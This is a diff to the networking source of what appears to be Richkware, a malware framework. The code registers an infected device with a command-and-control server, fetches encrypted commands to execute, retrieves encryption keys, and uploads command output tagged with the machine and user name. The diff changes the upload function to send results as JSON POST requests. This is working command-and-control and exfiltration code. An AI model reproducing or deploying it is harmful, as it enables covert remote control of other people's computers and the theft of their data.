@@ -147,12 +147,12 @@ bool Network::UploadInfoToRMS(const char *serverAddress, const char *port, const
     std::string associatedUserS = crypto.Encrypt(associatedUser);
 
     std::string packet = "PUT /Richkware-Manager-Server/device?data0=" + name +
-                                "&data1=" + serverPortS +
-                                "&data2=" + associatedUserS +
-                                " HTTP/1.1\r\n" +
-                                "Host: " + serverAddress + "\r\n" +
-                                "Connection: close\r\n" +
-                                "\r\n";
+                         "&data1=" + serverPortS +
+                         "&data2=" + associatedUserS +
+                         " HTTP/1.1\r\n" +
+                         "Host: " + serverAddress + "\r\n" +
+                         "Connection: close\r\n" +
+                         "\r\n";
 
     std::string response = RawRequest(serverAddress, port, packet.c_str());
     if (response.find("OK") != std::string::npos) {     //the request was successful
@@ -210,28 +210,51 @@ std::string Network::fetchCommand(const char *serverAddress, const char *port) {
 }
 
 bool Network::uploadCommand(std::string commandsOutput, const char *serverAddress, const char *port) {
+
     Crypto crypto(encryptionKey);
     std::string device = getenv("COMPUTERNAME");
     device.append("/");
     device.append(getenv("USERNAME"));
 
-    std::string packet = "POST /Richkware-Manager-Server/command?data0=" + device +
-                         "&data1=" + commandsOutput +
-                         " HTTP/1.1\r\n" +
-                         "Host: " + serverAddress + "\r\n" +
-                         "Connection: close\r\n" +
-                         "\r\n";
+    std::string srvAddr(serverAddress);
+    std::string prt(port);
 
-    std::string response = RawRequest(serverAddress, port,
-                                      packet.c_str()); //response è un JSON che contiene i comandi criptati da eseguire
-    std::cout << response << std::endl;
-    //parse message from server
-    if (response.find("OK") != std::string::npos) {
+    http::Request request("http://" + srvAddr + ":" + prt + "/Richkware-Manager-Server/command");
+
+    std::string parameters = "{device:\"" + device + "\",data:\"" + commandsOutput + "\"}";
+
+    http::Response response = request.send("POST", parameters, {
+            "Content-Type: application/json"
+    });
+
+    if (std::string(response.body.begin(), response.body.end()).find("OK") != std::string::npos) {
         return true;
-    } else {
-        //TODO: manage KO from server
-        return false;
     }
+    return false;
+
+//    std::string packet = "POST /Richkware-Manager-Server/command HTTP/1.1\r\nHost: " + srvAddr +
+//                         "\r\n" +
+//                         "Connection: close\r\n" +
+//                         "\r\n" +
+//                         "{\"device\": \"" + device + "\", \"data\": \"" + commandsOutput +"\"}";
+//    std::string packet = "POST /Richkware-Manager-Server/command HTTP/1.1\r\n"
+//                         "\r\n"
+//                         "Content-Type: application/json; charset=utf-8\r\n"
+//                         "Host: " + srvAddr + ":" + prt + "\r\n"
+//                         "Connection: Close\r\n"
+//                         "\r\n"
+//                         "{\"device\":\"" + device + "\",\"data\":\"" + commandsOutput + "\"}";
+//
+//    std::string response = RawRequest(serverAddress, port,
+//                                      packet.c_str()); //response è un JSON che contiene i comandi criptati da eseguire
+//    std::cout << response << std::endl;
+//    //parse message from server
+//    if (response.find("OK") != std::string::npos) {
+//        return true;
+//    } else {
+//        //TODO: manage KO from server
+//        return false;
+//    }
 }
 
 std::string Network::GetEncryptionKeyFromRMS(const char *serverAddress, const char *port, const char *associatedUser) {
@@ -249,7 +272,7 @@ std::string Network::GetEncryptionKeyFromRMS(const char *serverAddress, const ch
     std::string nameS = crypto.Encrypt(name);
 
     std::string packet = "GET /Richkware-Manager-Server/encryptionKey?id=" + nameS + " HTTP/1.1\r\n"
-            "Host: " + serverAddress + "\r\n" +
+                                                                                     "Host: " + serverAddress + "\r\n" +
                          "Connection: close\r\n" +
                          "\r\n";
 
